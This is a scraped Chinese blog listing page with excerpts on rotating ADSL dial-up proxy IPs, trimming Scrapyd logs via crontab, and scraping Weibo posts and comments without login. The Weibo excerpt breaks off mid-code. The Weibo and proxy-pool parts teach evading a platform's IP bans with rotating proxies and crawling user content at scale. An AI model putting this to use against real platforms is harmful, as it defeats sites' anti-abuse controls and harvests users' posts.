                  <p>拨号VPS需要每隔一段时间就拨号一次，我们可以直接执行命令行来拨号，那在Python里我们只需要调用一下这个拨号命令就好了。利用subprocess模块调用脚本即可，在这里定义一个变量ADSL_BASH为<code>adsl-stop;adsl-start</code>，这就是拨号的脚本。</p>
                  <figure class="highlight cpp">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">(status, output) = subprocess.getstatusoutput(ADSL_BASH)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>通过getstatusoutput方法可以获取脚本的执行状态和输出结果，如果status为0，则证明拨号成功，然后检测一下拨号接口是否获取了IP地址。 执行<code>ifconfig</code>命令可以获取当前的IP，我这台主机接口名称叫做ppp0，当然网卡名称可以自己指定，所以将ppp0接口的IP提取出来即可。</p>
                  <figure class="highlight routeros">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">def get_ip(self, <span class="attribute">ifname</span>=ADSL_IFNAME):</span><br><span class="line">    (status, output) = subprocess.getstatusoutput(<span class="string">'ifconfig'</span>)</span><br><span class="line">    <span class="keyword">if</span> status == 0:</span><br><span class="line">        pattern = re.compile(ifname + <span class="string">'.*?inet.*?(\d+\.\d+\.\d+\.\d+).*?netmask'</span>, re.S)</span><br><span class="line">        result = re.search(pattern, output)</span><br><span class="line">        <span class="keyword">if</span> result:</span><br><span class="line">           <span class="built_in"> ip </span>= result.group(1)</span><br><span class="line">            return ip</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>如果方法正常返回IP，则证明IP存在，拨号成功，接下来向远程主机发送请求即可，然后sleep一段时间重新再次拨号。 如果方法返回的值为空，那证明IP不存在，我们需要重新拨号。</p>
                  <h4 id="请求远程主机"><a href="#请求远程主机" class="headerlink" title="请求远程主机"></a>请求远程主机</h4>
                  <p>发送的时候需要携带这么几个信息，一个是通信秘钥，一个是代理端口，另一个是主机的标识符，用requests发送即可。</p>
                  <figure class="highlight haskell">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="title">requests</span>.post(<span class="type">SERVER_URL</span>, <span class="class"><span class="keyword">data</span>=&#123;'<span class="title">token'</span>: <span class="type">TOKEN</span>, '<span class="title">port'</span>: <span class="type">PROXY_PORT</span>, '<span class="title">name'</span>: <span class="type">CLIENT_NAME</span>&#125;)</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>所以整体的思路实现可以写成这样子：</p>
                  <figure class="highlight routeros">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">def adsl(self):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="builtin-name">print</span>(<span class="string">'ADSL Start, Please wait'</span>)</span><br><span class="line">            (status, output) = subprocess.getstatusoutput(ADSL_BASH)</span><br><span class="line">            <span class="keyword">if</span> status == 0:</span><br><span class="line">                <span class="builtin-name">print</span>(<span class="string">'ADSL Successfully'</span>)</span><br><span class="line">               <span class="built_in"> ip </span>= self.get_ip()</span><br><span class="line">                <span class="keyword">if</span> ip:</span><br><span class="line">                    <span class="builtin-name">print</span>(<span class="string">'New IP'</span>, ip)</span><br><span class="line">                    try:</span><br><span class="line">                        requests.post(SERVER_URL, data=&#123;<span class="string">'token'</span>: TOKEN, <span class="string">'port'</span>: PROXY_PORT, <span class="string">'name'</span>: CLIENT_NAME&#125;)</span><br><span class="line">                        <span class="builtin-name">print</span>(<span class="string">'Successfully Sent to Server'</span>, SERVER_URL)</span><br><span class="line">                    except ConnectionError:</span><br><span class="line">                        <span class="builtin-name">print</span>(<span class="string">'Failed to Connect Server'</span>, SERVER_URL)</span><br><span class="line">                    time.sleep(ADSL_CYCLE)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="builtin-name">print</span>(<span class="string">'Get IP Failed'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="builtin-name">print</span>(<span class="string">'ADSL Failed, Please Check'</span>)</span><br><span class="line">            time.sleep(1)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这样我们就可以做到定时拨号并向远程主机发送请求了。</p>
                  <h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2>
                  <p>Talk is cheap, show me the code! 在这里提供一份完整代码实现，其中client模块是在动态VPS主机运行，server模块在远程主机运行，具体的操作使用可以参考README。 <a href="https://github.com/Germey/ADSLProxyPool" target="_blank" rel="noopener">ADSLProxyPool</a></p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2017-05-19 14:50:15" itemprop="dateCreated datePublished" datetime="2017-05-19T14:50:15+08:00">2017-05-19</time>
                </span>
                <span id="/4596.html" class="post-meta-item leancloud_visitors" data-flag-title="使用Tornado+Redis维护ADSL拨号服务器代理池" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>7.8k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>7 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/4534.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> Python <i class="label-arrow"></i>
                  </a>
                  <a href="/4534.html" class="post-title-link" itemprop="url">Scrapyd日志输出优化</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p>现在维护着一个新浪微博爬虫，爬取量已经5亿+，使用了Scrapyd部署分布式。 Scrapyd运行时会输出日志到本地，导致日志文件会越来越大，这个其实就是Scrapy控制台的输出。但是这个日志其实有用的部分也就是最后那几百行而已，如果出错，去日志查看下出错信息就好了。 所以现在可以写一个脚本，来定时更新日志文件，将最后的100行保存下来就好了。 Scrapyd默认的日志目录是在用户文件夹下的logs目录。 所以在这里我们指定dir=~/logs 新建bash脚本，内容如下：</p>
                  <figure class="highlight bash">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">clean</span></span>() &#123;</span><br><span class="line">  <span class="keyword">for</span> file <span class="keyword">in</span> <span class="variable">$1</span>/*</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">if</span> [ -d <span class="variable">$file</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">      clean <span class="variable">$file</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">echo</span> <span class="variable">$file</span></span><br><span class="line">      temp=$(tail -100 <span class="variable">$file</span>)</span><br><span class="line">      <span class="built_in">echo</span> <span class="string">"<span class="variable">$temp</span>"</span> &gt; <span class="variable">$file</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dir=~/logs</span><br><span class="line">clean <span class="variable">$dir</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>新建这样的一个脚本，然后命名为 clean.sh，我的直接放在了用户文件夹下。 然后crontab创建定时任务。 执行</p>
                  <figure class="highlight ebnf">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="attribute">crontab -e</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>我们想要一分钟清理一次日志文件。 输入</p>
                  <figure class="highlight jboss-cli">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">*<span class="string">/1</span> * * * * <span class="string">/bin/sh</span> ~<span class="string">/clean.sh</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>然后退出之后，crontab就可以每隔一分钟执行一次clean.sh，清理日志了。 这样我们就不怕日志文件大量占用主机空间啦~</p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2017-05-17 14:49:03" itemprop="dateCreated datePublished" datetime="2017-05-17T14:49:03+08:00">2017-05-17</time>
                </span>
                <span id="/4534.html" class="post-meta-item leancloud_visitors" data-flag-title="Scrapyd日志输出优化" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>579</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>1 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/4465.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> Python <i class="label-arrow"></i>
                  </a>
                  <a href="/4465.html" class="post-title-link" itemprop="url">免登录新浪微博爬虫系列之第一篇 单博主微博及评论数据</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <blockquote>
                    <p>我的 GITHUB 地址：<a href="https://github.com/xiaosimao/weibo_spider" target="_blank" rel="noopener">https://github.com/xiaosimao/weibo_spider</a> 2017.05.04 更新： 感谢哥本哈根小树对于获取 containnerid 的指教，多谢。</p>
                    <p><em><strong>大家好，我是新人四毛，大家可以叫我小四毛，至于为什么，在家排行老四，农村人，就是那么任性。</strong></em></p>
                  </blockquote>
                  <p>好，自我介绍完毕，开始今天的学（zhuang）习（bi）之路。</p>
                  <blockquote>
                    <p><strong>说明：本文针对的是有一些爬虫基础的同学，所以看不太懂的同学先补一下基础。</strong></p>
                    <p><strong>本文的全部代码并没有上传到 GITHUB 中，而且本文的 code 部分给出的代码也是指导性的，大部分还是要靠大家自己动手完成。待后几篇博客出来以后，代码会放到上面。</strong></p>
                    <p><strong>大家如果有问题交流的话，欢迎在下面进行评论，或者可以加我 QQ:549411552(加的话麻烦注明来自静觅)，欢迎大佬拍砖指错，大家共同进步。</strong></p>
                  </blockquote>
                  <p>前几天，大才发布了一个视频，主要讲的是通过维护一个新浪微博 Cookies 池，抓取新浪微博的相关数据，爬取的站点是 weibo.cn。相关的代码在大才的 Github 里【大才的视频教程真的很用心，视频高清无码，希望大家可以支持大才，毕竟写了那么多精彩的教程真心不易】。</p>
                  <p>然而，如果你只是想简单的搞点数据，对技术一点兴趣都没有，又或者某宝搜来搜去都没有买到账号，又或者装个模拟登陆需要的模块都想跳楼，有没有除此之外其他的办法呢？你有没有想过在免登陆的情况下就可以获得你想要的数据呢？如果你这么想过而又没有做出来，那么接下来，让我们一起搞（qi）事（fei）吧。</p>
                  <p><a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/02/QQ图片20170205084843.jpg" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/02/QQ图片20170205084843.jpg" alt=""></a></p>
                  <p>本文重点提供解决问题的思路，会把最关键的点标示出来，代码基本没有。有什么不对或不足之处，还望大家指出，共同进步。</p>
                  <h3 id="1-前期准备"><a href="#1-前期准备" class="headerlink" title="1.前期准备"></a>1.前期准备</h3>
                  <p>代理 IP。虽说本文介绍的方法不需要 Cookies，但是代理 IP 还是需要的，要不然也是被新浪分分钟的 403（我测试的时候会出现）。如果你连 403 都不知道是什么，那么还是去看看大才的爬虫基础课程，或者不想看文字的话直接来报大才的视频课程课，哈哈（大才，今晚得加两个菜啊，我这吆喝的）。</p>
                  <p><a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/兔子.gif" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/兔子.gif" alt=""></a></p>
                  <h3 id="2-思路分析"><a href="#2-思路分析" class="headerlink" title="2.思路分析"></a>2.思路分析</h3>
                  <p>一般做爬虫爬取网站，首选的都是 m 站，其次是 wap 站，最后考虑 PC 站。当然，这不是绝对的，有的时候 PC 站的信息最全，而你又恰好需要全部的信息，那么 PC 站是你的首选。一般 m 站都以 m 开头后接域名，试一下 就好了，实在找不到，上网搜。</p>
                  <p>所以本文开搞的网址就是 m.weibo.cn。但是当你在浏览器中输入这个网址时，你得到的应该是下面这个页面，如果不是，说明你的浏览器保留了你最近登录微博的 cookie，这个时候，清空浏览器保存的数据，再次打开这个网页，就应该也是这个界面了：</p>
                  <p><a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/05/login-1.jpg" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/05/login-1.jpg" alt=""></a> <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/05/login.jpg" target="_blank" rel="noopener"></a> 我滴天，是的，你没看错，就是这个登录界面。你不是说不需要登录吗？怎么 TM 的还是这个万恶的界面？怎么破？WTF?</p>
                  <p><a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/表情2.jpg" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/表情2.jpg" alt=""></a></p>
                  <p>哈哈，其实一开始我也不知道，后来经人指点，才发现只要在后面加入一些东西之后就不会看到这个界面了。那么是什么呢？</p>
                  <p><em><strong>当当当当！！！！！！！！！！</strong></em></p>
                  <blockquote>
                    <p><strong><a href="http://m.weibo.cn/u/1713926427" target="_blank" rel="noopener">http://m.weibo.cn/u/1713926427</a></strong></p>
                  </blockquote>
                  <p><a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/表情1.jpg" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/表情1-300x300.jpg" alt=""></a></p>
                  <p>当你看到这个网址的时候，憋说话，一定要用心去感受，这个时候说话你的嘴都是咧着的，别问我为什么知道，我就是知道。</p>
                  <p><strong>用心去感受，真的。</strong></p>
                  <p>对了，上面网址最后的数字是博主的数字 ID，在 weibo.com 的源码里可以找到，这里不做说明了。</p>
                  <p>打开上述网址， 界面变成这个样子，是不是很厉害的样子（大手勿喷），拨云见日，对于老手来说，下面的他们就可以不看了，可以去抓包写代码了，但是对于一头雾水的小伙伴请接着往下看：</p>
                  <p><a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/05/home_page-1.jpg" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/05/home_page-1.jpg" alt=""></a></p>
                  <p>这就是本文爬虫的入口，没错，就说牛逼的榜姐，入口选一些质量高的，比如你想爬新闻方面信息，那么你就去找澎湃新闻，新浪新闻之类的。</p>
                  <p>通过该入口，我们可以抓取该博主的所有微博及评论信息，以及该博主关注的人的微博及评论信息，依次往后，循环不断。</p>
                  <p>在这里谈一点经验：</p>
                  <p><strong>其实做爬虫，最基础的当然是写代码的能力，抓包什么的都不是什么困难的事，抓包很简单很简单。我觉得最难的是找到入口，找到一个最适合的入口。怎么定义这个最适合呢？就是要去尝试，依照一般的顺序，先找找 M 站，再找找 wap 站，最后再去看 PC 站，找到一个合适的入口，往往会事半功倍。前几天抓取途牛网的相关游记信息，爬 PC 站分分钟的 302，但是爬 M 站，全是接口，全程无阻。</strong></p>
                  <p>因大多数人都是采集微博信息以及评论信息，所以下面将以这两方面为主。</p>
                  <p>剧透一下，在这里可以抓到的信息：</p>
                  <p>(1) <strong>博主信息 （没发现有价值的信息，下面抓包过程不讲）</strong></p>
                  <p>(2) <strong>博主微博信息（下文抓包讲解）</strong></p>
                  <p>(3) <strong>微博评论信息（下文抓包讲解）</strong></p>
                  <p>(4) <strong>热门微博信息（小时榜，日榜，周榜，月榜）（下文抓包未讲解，大家可以摸索一下）</strong></p>
                  <p>。。。。。。还有很多我没有细看，等待各位细细研究吧。</p>
                  <h3 id="3-抓包分析"><a href="#3-抓包分析" class="headerlink" title="3. 抓包分析"></a>3. 抓包分析</h3>
                  <p>首先，得会抓包，一般的浏览器的 Network 够用了。</p>
                  <p><strong>(1) 微博正文抓包</strong></p>
                  <p>点击 上图中的微博然后往下拉，抓包出现下图：</p>
                  <p><a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/05/post_content_zhuabao-1.jpg" target="_blank" rel="noopener"></a><a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/05/post_content_zhuabao-1-1.jpg" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/05/post_content_zhuabao-1-1.jpg" alt=""></a></p>
                  <p><strong>分析：</strong></p>
                  <blockquote>
                    <p>可以看到，服务器返回的数据为 json 格式，这个是做爬虫的最喜欢的了。返回的数据包括很多的字段，图中也以及做了标示，相信大家都能看的懂，看不懂那也没办法了。</p>
                  </blockquote>
                  <p>最后放上抓包的数据：</p>
                  <blockquote>
                    <ol>
                      <li>
                        <p><strong>Request URL</strong>:</p>
                        <p><a href="http://m.weibo.cn/api/container/getIndex?type=uid&amp;value=1713926427&amp;containerid=1076031713926427&amp;page=2" target="_blank" rel="noopener">http://m.weibo.cn/api/container/getIndex?type=uid&amp;value=1713926427&amp;containerid=1076031713926427&amp;page=2</a></p>
                      </li>
                      <li>
                        <p><strong>Request Method</strong>:</p>
                        <p>GET</p>
                      </li>
                      <li>
                        <p><strong>Query String Parameters</strong></p>
                        <p>type: uid</p>
                        <p>value: 1713926427</p>
                        <p>containerid: 1076031713926427</p>
                        <p>page: 2</p>
                      </li>
                    </ol>
                  </blockquote>
                  <p><strong>(2) 微博评论抓包</strong></p>
                  <p>单击微博内容，就可以抓包成功，如下图：</p>
                  <p><a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/05/comment_zhuabao.jpg" target="_blank" rel="noopener"></a><a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/05/comment_zhuabao-1.jpg" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/05/comment_zhuabao-1.jpg" alt=""></a> <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/05/comment_zhuabao.jpg" target="_blank" rel="noopener"></a> <strong> 分析：</strong></p>
                  <blockquote>
                    <p>从上面可以看出，这里的数据依然还是很好获取的。</p>
                  </blockquote>
                  <p>最后放上抓包的数据：</p>
                  <blockquote>
                    <ol>
                      <li>
                        <p><strong>Request URL</strong>:</p>
                        <p><a href="http://m.weibo.cn/api/comments/show?id=4103388327019042&amp;page=1" target="_blank" rel="noopener">http://m.weibo.cn/api/comments/show?id=4103388327019042&amp;page=1</a></p>
                      </li>
                      <li>
                        <p><strong>Request Method</strong>:</p>
                        <p>GET</p>
                      </li>
                      <li>
                        <p><strong>Query String Parameters</strong></p>
                        <p>id: 4103388327019042</p>
                        <p>page: 1</p>
                      </li>
                    </ol>
                  </blockquote>
                  <p><strong>再次分析：</strong></p>
                  <blockquote>
                    <p>通过抓包的数据可以发现，获取微博评论必须首先获得这条微博的 ID。所以，目前还是要对微博正文的抓包过程进行分析。</p>
                  </blockquote>
                  <h3 id="4-思路解析"><a href="#4-思路解析" class="headerlink" title="4. 思路解析"></a>4. 思路解析</h3>
                  <p>在上面的微博正文中发现需要提交以下数据：</p>
                  <blockquote>
                    <p>type: uid</p>
                    <p>value: 1713926427</p>
                    <p>containerid: 1076031713926427</p>
                    <p>page: 2</p>
                  </blockquote>
                  <p>其中：<strong>type</strong>(固定值)、<strong>value</strong>(博主微博 ID)、<strong>containerid</strong>(意义不明确，但是带了个 id 在里面，应该代表的是一个唯一性的一个标识)、<strong>page</strong>(页码)。页码在返回的数据中可以获得。</p>
                  <p>那么分析到这里，containerid 就是我们要找的最重要的信息。这个字段信息是不会凭空出现的，肯定产生于某一个请求之中，所以这时候，我们再回到开头，回到我们的初始。刷新入口网址，抓包发现了下面 3 个网址，见下图：</p>
                  <p><a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/05/home_zhuabao.jpg" target="_blank" rel="noopener"></a><a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/05/home_zhuabao-1.jpg" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/05/home_zhuabao-1.jpg" alt=""></a> <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/05/home_zhuabao.jpg" target="_blank" rel="noopener"></a> <strong> 分析：</strong></p>
                  <blockquote>
                    <p>这 3 个网址的格式一模一样，所以点进去看一下里面到底什么情况。</p>
                  </blockquote>
                  <p>下面的先点开<strong>网址 1</strong>看看：</p>
                  <p><a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/05/user_infojpg.jpg" target="_blank" rel="noopener"></a><a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/05/user_infojpg-1.jpg" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/05/user_infojpg-1.jpg" alt=""></a> <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/05/user_infojpg.jpg" target="_blank" rel="noopener"></a> <strong> 分析：</strong></p>
                  <blockquote>
                    <p>从返回的数据中，可以看到第 1 个网址的主要内容为 user_Info，即博主的个人信息，相关的字段在图中已经标示出来。最令人惊喜的是查找我们需要的 containerid 时，发现数据竟然就在其中，那么可以肯定我们需要的 containerid 就是在这个请求的返回值中，那么问题再次出现，这个请求的网址中又出现了一个 containerid，我们似乎又回到了原点，而且在用户的首页抓包中，在这个请求之前，也没有什么有意义的请求了，到这里是不是就进入死胡同了呢？其实不然，在这里我们就要进行多方面的尝试了，当我们将第一个网址中的 containerid 删掉以后，重新请求一次，发现返回的依然是这些数据，具体见下图：</p>
                  </blockquote>
                  <p><a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/05/no_containid-1.jpg" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/05/no_containid-1.jpg" alt=""></a></p>
                  <p><strong>分析：</strong></p>
                  <blockquote>
                    <p>而当我将第三个网址，也就是微博正文的网址中的 containerid 去掉后，返回的数据就是博主的个人信息了，而不是我们需要的微博正文，所以可以肯定第一个网址中的 containerid 并不是必须的，而对于网址 3，这个字段则是必须的。</p>
                  </blockquote>
                  <p>为了让这个爬虫可以顺着一个初始用户爬取到其他用户的相关信息，甚至全网的信息，那么我们就需要让爬虫自己去添加待爬任务。本文选择的初始用户有 3000 多万的粉丝数，就是人们常说的微博大 V。在做这一类的信息爬取时，我们往往关注的是数据的质量，所以我们选择初始用户的关注用户作为下一级的用户。在下一级中，这些用户将被作为初始用户。这样周而复始，最理想的情况当然就是可以把微博全站的质量还不错的博主的微博以及下面的评论都抓取了。但是在实际的操作过程中会发现微博的用户质量真的是参差不齐，所以我们在筛选后面的用户时，可以加一些限制条件，如用户的粉丝数等等。在这里找寻初始用户关注用户信息的这一过程就省略了，留给大家探索一下，很简单。</p>
                  <p>所以到这里，我们的整个流程就理清了（单个博主，如需循环，则只需要找到下一级用户的 ID 即可，相信这对于聪明的大家肯定不难的）：</p>
                  <blockquote>
                    <p>请求用户主页网址—&gt;得到 containerid，请求微博正文网址—&gt;保存博文相关信息，取出博文 ID，请求评论网址—&gt;得到评论信息</p>
                  </blockquote>
                  <h3 id="5-CODE-TIME"><a href="#5-CODE-TIME" class="headerlink" title="5. CODE TIME"></a>5. CODE TIME</h3>
                  <p>思路已经理清了，那么下面就是 CODE TIME 了，毕竟:</p>
                  <blockquote>
                    <p>TALK IS CHEAP,SHOW ME YOUR CODE</p>
                  </blockquote>
                  <p>本文采用 scrapy 编写，重写个 proxy 中间件，即可实现每一个 request 带一个随机 IP，减少被封禁的概率，同时尽量把重试的次数设置大一些。</p>
                  <p>想要保存哪些信息，根据自身的业务需求而定，具体的信息，能找到的都可以在每一个请求返回的内容中找到，都是 json 格式的，所以这里的代码只是将上面讲的流程实现了一遍，其他的都没有实现。</p>
                  <figure class="highlight routeros">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">import scrapy</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">class SinaSpider(scrapy.Spider):</span><br><span class="line">    name = <span class="string">"sina"</span></span><br><span class="line">    allowed_domains = [<span class="string">"m.weibo.cn"</span>]</span><br><span class="line">    # root id</span><br><span class="line">    first_id = <span class="string">'1713926427'</span></span><br><span class="line"></span><br><span class="line">    def start_requests(self):</span><br><span class="line">        # <span class="keyword">to</span> <span class="builtin-name">get</span> containerid</span><br><span class="line">        url = <span class="string">'http://m.weibo.cn/api/container/getIndex?type=uid&amp;value=&#123;&#125;'</span>.format(self.first_id)</span><br><span class="line">        yield scrapy.Request(<span class="attribute">url</span>=url, <span class="attribute">callback</span>=self.get_containerid)</span><br><span class="line"></span><br><span class="line">    def get_containerid(self,response):</span><br><span class="line">        content = json.loads(response.body)</span><br><span class="line">        # here, we can <span class="builtin-name">get</span> containerid</span><br><span class="line">        containerid = None</span><br><span class="line">        <span 